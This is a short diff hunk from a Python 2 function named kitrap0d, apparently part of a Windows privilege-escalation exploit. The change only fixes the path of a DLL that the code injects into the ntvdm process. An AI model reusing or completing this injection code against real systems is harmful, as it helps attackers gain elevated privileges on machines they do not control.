@@ -91,4 +91,4 @@ def kitrap0d():
     kernel32.CloseHandle(process_information.hThread)
     kernel32.CloseHandle(process_information.hProcess)
     ntvdminject = dllinject.Process(handle=ntvdm)
-    print ntvdminject.inject("MemoryModule.dll")
+    print ntvdminject.inject("MemoryModule\\MemoryModule.dll")
